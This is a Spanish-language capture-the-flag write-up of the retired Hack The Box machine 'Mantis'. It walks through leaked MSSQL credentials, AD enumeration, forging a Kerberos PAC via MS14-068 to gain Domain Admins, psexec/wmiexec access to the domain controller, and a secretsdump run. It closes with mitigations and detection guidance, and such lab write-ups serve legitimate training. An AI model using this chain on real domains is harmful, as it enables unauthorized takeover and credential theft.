---
machine: Mantis
os: Windows
difficulty: Hard
platform: Hack The Box
category: Machines
state: Retired
pwned: null
tags: [windows, active-directory, kerberos, ms14-068, mssql, iis]
---

# Mantis — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (febrero de 2018). Ficha de referencia; no jugada en este perfil.
> Sin flags, credenciales ni hashes reales.

## TL;DR

Un IIS con Orchard CMS en el puerto 1337 y un SQL Server exponen credenciales de dominio. Con una cuenta válida se enumera Active Directory y se explota **MS14-068 (CVE-2014-6324)**: el KDC acepta un PAC firmado con la clave de un usuario normal y permite forjar un TGT con pertenencia a `Domain Admins`. El resultado es acceso administrativo al controlador de dominio.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 53,88,135,139,389,445,1337,1433,3268,3389 <TARGET_IP>
```

| Puerto | Servicio | Observación |
|---|---|---|
| 53/tcp | DNS | Dominio `htb.local` |
| 88/tcp | Kerberos | KDC |
| 389/3268 | LDAP | Enumeración de AD |
| 445/tcp | SMB | Recursos y autenticación |
| 1337/tcp | HTTP | IIS + Orchard CMS |
| 1433/tcp | MSSQL | SQL Server Express |

```bash
echo "<TARGET_IP> mantis.htb.local htb.local" | sudo tee -a /etc/hosts
```

## Enumeración

- `http://mantis.htb.local:1337/` responde con Orchard CMS.
- `gobuster dir` sobre el sitio descubre rutas de administración y ficheros de configuración.
- `smbclient -L //<TARGET_IP>/ -N` confirma el dominio y el hostname.
- La aplicación filtra credenciales de una cuenta de base de datos en su configuración. Se prueban contra MSSQL y contra LDAP.

```bash
mssqlclient.py '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>' -windows-auth
```

Una vez dentro de MSSQL se comprueba si la cuenta puede leer información de dominio o ejecutar consultas contra el DC. La cuenta válida basta para pedir un TGT: no hace falta ser administrador.

## Foothold

### 1. Contexto de dominio

```bash
nxc smb <TARGET_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN>
nxc ldap <TARGET_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --users
```

Se identifica el DC, el nombre del dominio y el SID del usuario comprometido. MS14-068 necesita ese SID y la clave de la cuenta, no privilegios previos.

### 2. Forja del PAC

```bash
python3 ms14-068.py -u '<USER>@<DOMAIN>' -p '<PASSWORD>' \
  -s '<USER_SID>' -d <DC_IP>
```

El script genera un `.ccache` con un TGT cuyo PAC incluye grupos de administrador. La vulnerabilidad está en que el KDC no valida correctamente la firma del PAC cuando el cliente presenta un TGT manipulado.

```bash
export KRB5CCNAME=./<USER>.ccache
klist
```

### 3. Uso del ticket

```bash
psexec.py -k -no-pass '<DOMAIN>/<USER>@<DC_HOST>'
# alternativa
wmiexec.py -k -no-pass '<DOMAIN>/<USER>@<DC_HOST>'
```

El ticket se presenta directamente contra el DC. Si el reloj está desincronizado, Kerberos falla con `KRB_AP_ERR_SKEW`; se ajusta antes de continuar.

## Movimiento lateral

- No es un pivote de red: el salto es lógico, de una cuenta de usuario a un TGT de administrador.
- El mismo `.ccache` sirve para SMB, WMI, WinRM y LDAP mientras el ticket sea válido.
- Se enumera el dominio con BloodHound antes de tocar el DC para confirmar que el PAC forjado es la vía más corta.

## Escalada de privilegios

La escalada es la propia forja del PAC: el TGT incluye `Domain Admins`. Con el ticket se accede al DC y se leen las flags administrativas.

```bash
nxc smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -k --shares
secretsdump.py -k -no-pass '<DOMAIN>/<USER>@<DC_HOST>'
```

No se documentan hashes ni credenciales derivadas. La limpieza consiste en invalidar el ticket y rotar la contraseña de la cuenta comprometida.

## Evidencia

- Respuesta de Orchard CMS en 1337 y SQL Server en 1433.
- `klist` mostrando el TGT emitido para el usuario.
- Acceso al DC con `psexec`/`wmiexec` usando `-k -no-pass`.
- Captura recortada de `whoami /groups` con `Domain Admins`.

## Lecciones aprendidas

- MS14-068 no requiere un dominio mal configurado: afecta a controladores sin el parche de noviembre de 2014.
- Un usuario normal con credenciales válidas puede convertirse en administrador si el KDC confía en un PAC manipulado.
- La sincronización horaria es parte de la explotación; sin ella, el ticket no se usa.
- En un pentest real, la cuenta de base de datos expuesta en la web ya es un hallazgo crítico por sí mismo.

## Mitigaciones y detección

- Aplicar **KB3011780** en todos los controladores de dominio.
- Auditar cuentas con permisos innecesarios sobre bases de datos y aplicaciones web.
- Detección: **4768** con un PAC anómalo o un TGT solicitado con grupos que el usuario no tiene; **4624** tipo 3 desde una estación no habitual; uso de `psexec`/WMI contra el DC.
- Alertar de la creación de servicios (`7045`) y de accesos administrativos fuera de ventana.

MITRE: T1558, T1078, T1021.002, T1069.002.

## Referencias

- <https://nvd.nist.gov/vuln/detail/CVE-2014-6324>
- <https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068>
- <https://foobarto.me/htb/machines/mantis>
